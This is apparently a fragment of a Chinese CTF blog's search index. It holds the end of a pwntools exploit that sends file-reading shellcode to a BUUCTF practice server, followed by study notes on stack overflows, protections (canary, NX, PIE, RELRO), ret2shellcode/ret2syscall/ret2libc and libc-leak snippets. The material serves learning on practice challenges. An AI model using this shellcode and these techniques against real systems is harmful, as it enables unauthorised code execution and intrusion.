<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">28528</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#x27;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;shellcode:&#x27;</span>, shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>32bit</tag>
        <tag>shellcode</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn知识点整理</title>
    <url>/pwn%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><h3 id="汇编的各个段"><a href="#汇编的各个段" class="headerlink" title="汇编的各个段"></a>汇编的各个段</h3><p>汇编代码把内存氛围以下几个段 bss、data、text、rodata</p>
<h4 id="bss段："><a href="#bss段：" class="headerlink" title="bss段："></a>bss段：</h4><p>BSS段（bsssegment）通常是指用来存放程序中未初始化的全局变量的一块内存区域。BSS是英文BlockStartedby Symbol的简称。BSS段属于静态内存分配。</p>
<h4 id="data段："><a href="#data段：" class="headerlink" title="data段："></a>data段：</h4><p>数据段（datasegment）通常是指用来存放程序中已初始化的全局变量的一块内存区域。数据段属于静态内存分配。</p>
<h4 id="text段："><a href="#text段：" class="headerlink" title="text段："></a>text段：</h4><p>代码段（codesegment&#x2F;textsegment）通常是指用来存放程序执行代码的一块内存区域。这部分区域的大小在程序运行前就已经确定，并且内存区域通常属于只读,某些架构也允许代码段为可写，即允许修改程序。在代码段中，也有可能包含一些只读的常数变量，例如字符串常量等。</p>
<h4 id="rodata段："><a href="#rodata段：" class="headerlink" title="rodata段："></a>rodata段：</h4><p>存放C中的字符串和#define定义的常量</p>
<h4 id="heap堆："><a href="#heap堆：" class="headerlink" title="heap堆："></a>heap堆：</h4><p>堆是用于存放进程运行中被动态分配的内存段，它的大小并不固定，可动态扩张或缩减。当进程调用malloc等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；当利用free等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）</p>
<h4 id="stack栈："><a href="#stack栈：" class="headerlink" title="stack栈："></a>stack栈：</h4><p>用于用户存放程序临时创建的局部变量，也就是说我们函数括弧“{}”中定义的变量（但不包括static声明的变量，static意味着在数据段中存放变量）。除此以外，在函数被调用时，其参数也会被压入发起调用的进程栈中，并且待到调用结束后，函数的返回值也会被存放回栈中。由于栈的先进先出特点，所以栈特别方便用来保存&#x2F;恢复调用现场。从这个意义上讲，我们可以把堆栈看成一个寄存、交换临时数据的内存区</p>
<h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><p><a href="https://www.cnblogs.com/wisehead/articles/3819233.html">https://www.cnblogs.com/wisehead/articles/3819233.html</a></p>
<p>最需要关注的是rbp、rsp、eip。</p>
<h4 id="rbp与rsp"><a href="#rbp与rsp" class="headerlink" title="rbp与rsp"></a>rbp与rsp</h4><p>rbp与rsp是用于划分栈帧的，rbp是底，rsp是顶。</p>
<p>rsp永远指向栈中的第一个值，并非空，而rbp指向上一调用函数的rbp。</p>
<p>push会把参数压栈并把使得ebp-4&#x2F;8，往上移一个位置，pop会弹栈并赋值到指定位置，并使得rsp+4&#x2F;8，往下移一个位置。</p>
<h4 id="eip"><a href="#eip" class="headerlink" title="eip"></a>eip</h4><p>eip是指明下一指令的地址。</p>
<h3 id="压栈的顺序"><a href="#压栈的顺序" class="headerlink" title="压栈的顺序"></a>压栈的顺序</h3><h4 id="32位压栈顺序"><a href="#32位压栈顺序" class="headerlink" title="32位压栈顺序"></a>32位压栈顺序</h4><p>首先倒序压函数参数，再压ret地址，最后压rbp。</p>
<h4 id="64位压栈顺序"><a href="#64位压栈顺序" class="headerlink" title="64位压栈顺序"></a>64位压栈顺序</h4><p>一样首先压ret地址，如果当前函数有rbp则再压rbp。函数参数是寄存器+栈来组合传参，当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</p>
<h3 id="栈溢出的原理"><a href="#栈溢出的原理" class="headerlink" title="栈溢出的原理"></a>栈溢出的原理</h3><p><a href="https://paper.seebug.org/271/">https://paper.seebug.org/271/</a></p>
<p>在函数中，有一些输入函数，例如gets、read，如果这些函数在使用的时候没有限制输入的内容长度，那么它们就可能溢出，把输入的内容覆盖到rbp以及ret处。通过构造输入内容，把覆盖的ret地址修改为我们所需要执行的函数就可以控制程序的函数调用了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果有参数，则逆序把参数push到栈中</span><br><span class="line">call xxx</span><br><span class="line">相当于</span><br><span class="line">push xxx</span><br><span class="line">mov eip，xxx</span><br><span class="line"></span><br><span class="line">如果函数需要保持栈帧，则在进入函数后的第一条语句进行</span><br><span class="line">push rbp，保存上一函数的rbp地址</span><br><span class="line"></span><br><span class="line">leave</span><br><span class="line">相当于</span><br><span class="line">mov rsp,rbp;``//将ebp指向（ebp内部应当保存一个地址，所谓指向即这个地址对应的空间）的值赋给rsp</span><br><span class="line">pop rbp </span><br><span class="line"></span><br><span class="line">ret</span><br><span class="line">相当于</span><br><span class="line">pop eip</span><br></pre></td></tr></table></figure>



<h3 id="PLT-amp-GOT表以及延迟绑定机制"><a href="#PLT-amp-GOT表以及延迟绑定机制" class="headerlink" title="PLT&amp;GOT表以及延迟绑定机制"></a>PLT&amp;GOT表以及延迟绑定机制</h3><p><a href="https://cloud.tencent.com/developer/article/1590167">https://cloud.tencent.com/developer/article/1590167</a></p>
<p>plt：指向函数，在ret2libc题目中，把它的plt地址当函数地址用就行，程序会自动链接到真正的函数地址。</p>
<p>got：里面存储的是真正的函数地址，在ret2libc题目中，想打印一个函数的真实地址，把它当作输出函数的参数即可，</p>
<p>例如puts(system的got表地址)。</p>
<p>plt和call不一样，如果ret到call system的话，system地址后面不需要填充ret地址‘aaaa’或者‘aaaaaaaa’，如果是使用plt跳转的话，则需要填充ret地址</p>
<h3 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h3><h4 id="一：canary"><a href="#一：canary" class="headerlink" title="一：canary"></a>一：canary</h4><p>Canary是金丝雀的意思。技术上表示最先的测试的意思。这个来自以前挖煤的时候，矿工都会先把金丝雀放进矿洞，或者挖煤的时候一直带着金丝雀。金丝雀对甲烷和一氧化碳浓度比较敏感，会先报警。所以大家都用canary来搞最先的测试。stack canary表示栈的报警保护。<br>在函数返回值之前添加的一串随机数（不超过机器字长），末位为&#x2F;x00（提供了覆盖最后一字节输出泄露canary的可能），如果出现缓冲区溢出攻击，覆盖内容覆盖到canary处，就会改变原本该处的数值，当程序执行到此处时，会检查canary值是否跟开始的值一样，如果不一样，程序会崩溃，从而达到保护返回地址的目的。</p>
<h4 id="二：NX保护"><a href="#二：NX保护" class="headerlink" title="二：NX保护"></a>二：NX保护</h4><p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。栈溢出的核心就是通过局部变量覆盖返回地址，然后加入shellcode，NX策略是使栈区域的代码无法执行。<br>当NX保护开启，就表示题目给了你system（‘&#x2F;bin&#x2F;sh’），如果关闭，表示你需要自己去构造shellcode，可参考我的level2</p>
<h4 id="三：PIE"><a href="#三：PIE" class="headerlink" title="三：PIE"></a>三：PIE</h4><p>PIE（ASLR），内存地址随机化机制（address space layout randomization)，有以下三种情况<br>0 - 表示关闭进程地址空间随机化。<br>1 - 表示将mmap的基址，stack和vdso页面随机化。<br>2 - 表示在1的基础上增加堆（heap）的随机化。<br>该保护能使每次运行的程序的地址都不同，防止根据固定地址来写exp执行攻击。<br>liunx下关闭PIE的命令如下：<br>sudo -s echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</p>
<h4 id="四：RELRO"><a href="#四：RELRO" class="headerlink" title="四：RELRO"></a>四：RELRO</h4><p>Relocation Read-Only (RELRO) 可以使程序某些部分成为只读的。它分为两种，Partial RELRO 和 Full RELRO，即 部分RELRO 和 完全RELRO。</p>
<p>部分RELRO 是 GCC 的默认设置，几乎所有的二进制文件都至少使用 部分RELRO。这样仅仅只能防止全局变量上的缓冲区溢出从而覆盖 GOT。</p>
<p>完全RELRO 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。</p>
<h3 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h3><h4 id="gets-void-buf"><a href="#gets-void-buf" class="headerlink" title="gets(void * buf)"></a>gets(void * buf)</h4><p>直到遇到回车结束，直接读取一行，忽略’\x00’</p>
<h4 id="read-int-fd-void-buf-size-t-count"><a href="#read-int-fd-void-buf-size-t-count" class="headerlink" title="read(int fd, void * buf, size_t count);"></a>read(int fd, void * buf, size_t count);</h4><p>读count长度的内容，如果count比buf输入缓冲要大，则造成溢出</p>
<h4 id="scanf-const-char-format-…"><a href="#scanf-const-char-format-…" class="headerlink" title="scanf(const char *format,…)"></a>scanf(const char *format,…)</h4><p>从标准输入 stdin 读取格式化输入</p>
<p>还有strcpy、strcat，遇到’\x00’停止</p>
<h3 id="栈溢出的基本类型"><a href="#栈溢出的基本类型" class="headerlink" title="栈溢出的基本类型"></a>栈溢出的基本类型</h3><h4 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h4><p>思路：通过输入函数的溢出覆盖ret地址，修改ret地址为我们需要执行的函数，控制程序的流向。</p>
<h4 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h4><p><a href="https://www.freebuf.com/vuls/179724.html">https://www.freebuf.com/vuls/179724.html</a></p>
<p>适用情况：NX保护未开启，栈拥有可执行权限</p>
<p>思路：通过输入函数把shellcode写到栈中，然后覆盖ret地址指向shellcode的起始地址，指向shellcode。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># context(os=&quot;linux&quot;, arch=&quot;i386&quot;)  32位系统* </span></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>)   <span class="number">64</span>位系统</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>



<h4 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h4><p><a href="https://www.freebuf.com/articles/system/234228.html">https://www.freebuf.com/articles/system/234228.html</a></p>
<p>思路：调用int80，设置eax、ebx、ecx、edx，把ret地址设置为int_80的地址即可。</p>
<ul>
<li>系统调用号，即 eax 应该为 0xb</li>
<li>第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以。</li>
<li>第二个参数，即 ecx 应该为 0</li>
<li>第三个参数，即 edx 应该为 0</li>
</ul>
<p>1、rop：在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</p>
<p>2、gadgets：在程序中的指令片段，有时我们为了达到我们执行命令的目的，需要多个gadget来完成我们的功能。gadget最后一般都有ret，因为我们需要将程序控制权(EIP)给下一个gadget。即让程序自动持续的选择堆栈中的指令依次执行。</p>
<p>3、ropgadgets：一个pwntools的一个命令行工具，用来具体寻找gadgets的。例如：我们从pop、ret序列当中寻找其中的eax</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary ./7.exe --only &quot;pop|ret&quot; | grep &quot;eax&quot;</span><br></pre></td></tr></table></figure>

<p>4、在linux系统中，函数的调用是有一个系统调用号的。我们实验要调用的execve(“&#x2F;bin&#x2F;sh”,null,null)函数其系统调用号是11，即十六进制0xb。</p>
<h4 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h4><p>适用情况：开启了地址随机化，开了NX保护</p>
<p><a href="https://www.freebuf.com/news/182894.html">https://www.freebuf.com/news/182894.html</a></p>
<p>思路：通过printf、puts、write把某一个libc函数打印出来，然后使用LibcSearcher根据该地址找到Libc版本，让该函数的绝对地址减去libc版本获取到的地址，得到libc的基址。再获取该Libc版本的system函数以及&#x2F;bin&#x2F;sh字符串的偏移量，与基址相加，就得到了它们的绝对地址，构造ROP就可以执行system(‘&#x2F;bin&#x2F;sh’)</p>
<p>​		ret2libc 这种攻击方式主要是针对 动态链接(Dynamic linking) 编译的程序，因为正常情况下是无法在程序中找到像 system() 、execve() 这种系统级函数(如果程序中直接包含了这种函数就可以直接控制返回地址指向他们，而不用通过这种麻烦的方式)。因为程序是动态链接生成的，所以在程序运行时会调用 libc.so (程序被装载时，动态链接器会将程序所有所需的动态链接库加载至进程空间，libc.so 就是其中最基本的一个)，libc.so 是 linux 下 C 语言库中的运行库glibc 的动态链接版，并且 libc.so 中包含了大量的可以利用的函数，包括 system() 、execve() 等系统级函数，我们可以通过找到这些函数在内存中的地址覆盖掉返回地址来获得当前进程的控制权。通常情况下，我们会选择执行 system(“&#x2F;bin&#x2F;sh”) 来打开 shell， 如此就只剩下两个问题：</p>
<blockquote>
<p>1、找到 system() 函数的地址；</p>
</blockquote>
<blockquote>
<p> 2、在内存中找到 “&#x2F;bin&#x2F;sh” 这个字符串的地址。</p>
</blockquote>
<h3 id="环境安装搭建"><a href="#环境安装搭建" class="headerlink" title="环境安装搭建"></a>环境安装搭建</h3><h4 id="pwngdb"><a href="#pwngdb" class="headerlink" title="pwngdb"></a>pwngdb</h4><p><a href="https://www.zhaixue.cc/gdb/gdb-install.html">https://www.zhaixue.cc/gdb/gdb-install.html</a></p>
<p><a href="https://blog.csdn.net/Breeze_CAT/article/details/103789233">https://blog.csdn.net/Breeze_CAT/article/details/103789233</a></p>
<h4 id="pwntools-python"><a href="#pwntools-python" class="headerlink" title="pwntools  python"></a>pwntools  python</h4><p><a href="https://blog.csdn.net/weixin_43833642/article/details/104181681">https://blog.csdn.net/weixin_43833642/article/details/104181681</a></p>
<h4 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h4><p><a href="https://blog.csdn.net/weixin_45556441/article/details/114631043">https://blog.csdn.net/weixin_45556441/article/details/114631043</a></p>
<p>context(arch &#x3D; ‘amd64’, os &#x3D; ‘linux’, log_level &#x3D; ‘debug’) </p>
<p>context(arch &#x3D; ‘i386’, os &#x3D; ‘linux’, log_level &#x3D; ‘debug’) </p>
<p>shellcode&#x3D;asm(shellcraft.sh()) </p>
<p>p.sendline(shellcode)</p>
<h3 id="libc接收"><a href="#libc接收" class="headerlink" title="libc接收"></a>libc接收</h3><p>read_addr &#x3D; u32(p.recvuntil(“\xf7”)[-4:])</p>
<p>write_addr&#x3D;u64(r.recvuntil(‘\x7f’)[-6:].ljust(8,’\x00’))</p>
<p>puts_addr &#x3D; u64(p.recvuntil(‘\n’)[:-1].ljust(8,’\0’))</p>
<p>getshell可以使用system(‘&#x2F;bin&#x2F;sh’) system(‘&#x2F;sh’) system(‘sh’) 因此找到的字符串有&#x2F;bin&#x2F;sh、&#x2F;sh或者sh。这里使用ROPgadget找到了，注意在IDA查看字符串的话是找不到的。</p>
<p>#程序需要正常退出才能输出结果，因此执行完getflag后就exit</p>
<p>read_addr &#x3D; u32(p.recvuntil(“\xf7”)[-4:])</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
</search>
